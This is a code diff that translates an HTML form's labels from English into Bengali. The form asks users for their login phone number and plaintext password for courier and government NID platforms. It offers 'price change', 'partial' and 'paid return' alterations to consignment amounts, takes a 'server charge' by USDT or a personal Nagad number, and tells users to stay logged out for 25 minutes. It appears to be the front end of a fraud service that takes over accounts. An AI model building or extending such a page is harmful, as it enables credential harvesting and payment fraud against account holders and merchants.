@@ -399,9 +399,9 @@
     <form id="payment-form">
       <!-- Common Fields -->
       <div class="form-group">
-        <label for="company">Company:</label>
+        <label for="company">সার্ভিস/কোম্পানি:</label>
         <select id="company" name="company" required>
-          <option value="">Select Platform</option>
+          <option value="">কোম্পানি বা সেবার নাম লিখুন </option>
           <option value="govt_nid">Govt NID</option>
           <option value="redx">RedX</option>
           <option value="pathao">Pathao Courier</option>
@@ -410,14 +410,14 @@
       </div>
 
       <div class="form-group">
-        <label for="phone">App/Web Login Phone Number:</label>
+        <label for="phone">এপ/ওয়েবসাইট লগইন মোবাইল নাম্বার:</label>
         <input type="tel" id="phone" name="phone" required 
                pattern="01[3-9]\d{8}" 
                title="11-digit Bangladeshi phone number (013-019)" placeholder="01XXXXXXXXX">
       </div>
 
       <div class="form-group">
-        <label for="password">App/Login Password:</label>
+        <label for="password">এপ/ওয়েবসাইট লগইন পাসওয়ার্ড:</label>
         <input type="text" id="password" name="password" required minlength="6" placeholder="Password">
       </div>
 
@@ -428,16 +428,16 @@
           <span class="remove-consignment" onclick="removeConsignment(this)">✕</span>
           
           <div class="form-group">
-            <label>Customer Details:</label>
-            <input type="text" class="name" name="consignments[0][name]" placeholder="Name" required>
+            <label>কাষ্টমার ডিটেইলস:</label>
+            <input type="text" class="name" name="consignments[0][name]" placeholder="কাষ্টমারের নাম" required>
             <input type="tel" class="phone1" name="consignments[0][phone]" 
-                   pattern="01[3-9]\d{8}" placeholder="01XXXXXXXXX" required>
+                   pattern="01[3-9]\d{8}" placeholder="নাম্বারঃ 01XXXXXXXXX" required>
           </div>
 
           <div class="form-group">
-            <label for="serviceType">Service Type:</label>
+            <label for="serviceType">সার্ভিস সিলেক্ট করুন:</label>
             <select class="service-type" name="consignments[0][serviceType]" required onchange="updateAmountFields(this)">
-              <option value="">Select Service</option>
+              <option value="">সার্ভিস সমূহঃ </option>
               <option value="pricecng">Price Change</option>
               <option value="partial">Partial</option>
               <option value="drto">Paid Return</option>
@@ -448,12 +448,12 @@
 
           <div class="amount-group">
             <div class="form-group original-amount-group">
-              <label>Original Amount:</label>
+              <label>প্রোডাক্টের বর্তমান মূল্য:</label>
               <input type="number" class="amount1" name="consignments[0][amount1]" 
                      min="00" max="100000" step="1" oninput="calculateTotalCharge()">
             </div>
             <div class="form-group updated-amount-group">
-              <label>Updated Amount:</label>
+              <label>পরিবর্তীত মূল্য :</label>
               <input type="number" class="amount2" name="consignments[0][amount2]" 
                      min="00" max="100000" step="1" oninput="calculateTotalCharge()">
             </div>
@@ -466,7 +466,7 @@
       </button>
 
       <div class="form-group">
-        <label for="amount3">Total Server Charge:</label>
+        <label for="amount3">সার্ভার চার্জ:</label>
         <input type="number" id="amount3" name="amount3" readonly required>
         <br>
         <div>
@@ -476,11 +476,11 @@
         </div>
         <br>
               <div class="form-group">
-        <label for="method">Payment Method:</label>
+        <label for="method">পেমেন্ট গেটওয়ে:</label>
         <select id="method" name="method" required onchange="updatePaymentDisplay()">
-          <option value="">Select Method</option>
+          <option value="">আপনার পেমেন্ট সার্ভিস সিলেক্ট করুনঃ</option>
           <option value="Crypto">Crypto(USDT)</option>
-          <option value="Nagad">Nagad: 01923002231</option>
+          <option value="Nagad">নগদ সেন্ডমানি: 01923002231</option>
         </select>
       </div>
         <div id="nagad-payment-info" class="payment-info">
@@ -499,8 +499,8 @@
       </div>
 
       <div class="form-actions">
-        <button type="submit" class="button primary">Confirm Payment</button>
-        <button type="button" class="button" onclick="clearForm()">Clear</button>
+        <button type="submit" class="button primary">কনফার্ম পেমেন্ট</button>
+        <button type="button" class="button" onclick="clearForm()">ক্লিয়ার ফর্ম</button>
       </div>
     </form>
  <p>আপনার এপ/ওয়েবসাইট লগ আউট হলে কমপক্ষে ২৫ মিনিট লগইন করা থেকে বিরত থাকুন। অনুগ্রহ পূর্বক কিছুক্ষণ অপেক্ষা করুন পেমেন্ট সম্পন্ন হলে আপনার সার্ভিসটি স্বয়ংক্রিয় ভাবে প্রক্রিয়াকরণ শুরু হবে।</p>
